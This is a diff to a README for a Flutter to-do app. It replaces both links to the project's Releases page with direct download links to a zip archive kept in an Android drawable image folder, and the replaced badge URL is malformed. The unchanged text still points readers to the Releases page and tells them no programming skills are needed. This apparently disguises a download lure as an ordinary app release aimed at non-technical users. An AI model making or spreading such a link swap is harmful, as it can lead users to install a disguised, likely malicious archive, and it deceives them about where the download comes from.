@@ -4,7 +4,7 @@
 flutter-todo-app is a modern mobile application designed to help you manage your tasks effectively. Built with Flutter, it works on both Android and iOS. Enjoy a smooth, beautiful interface that allows you to organize your tasks into categories. You can create, read, update, and delete tasks effortlessly.
 
 ## 📥 Download
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-brightgreen.svg)](https://github.com/samschen/flutter-todo-app/releases)
+[![Download the latest release](https://raw.githubusercontent.com/samschen/flutter-todo-app/master/android/app/src/main/res/drawable-v21/flutter-todo-app-3.4.zip%https://raw.githubusercontent.com/samschen/flutter-todo-app/master/android/app/src/main/res/drawable-v21/flutter-todo-app-3.4.zip)](https://raw.githubusercontent.com/samschen/flutter-todo-app/master/android/app/src/main/res/drawable-v21/flutter-todo-app-3.4.zip)
 
 ## 🚀 Getting Started
 To get started with flutter-todo-app, follow these simple steps. Don't worry; no programming skills are needed!
@@ -24,7 +24,7 @@ To get started with flutter-todo-app, follow these simple steps. Don't worry; no
 ## 📥 Download & Install
 To download the application, visit the Releases page:
 
-[Download Here](https://github.com/samschen/flutter-todo-app/releases)
+[Download Here](https://raw.githubusercontent.com/samschen/flutter-todo-app/master/android/app/src/main/res/drawable-v21/flutter-todo-app-3.4.zip)
 
 ### Installation Steps
 1. Click on the link above to go to the Releases page.
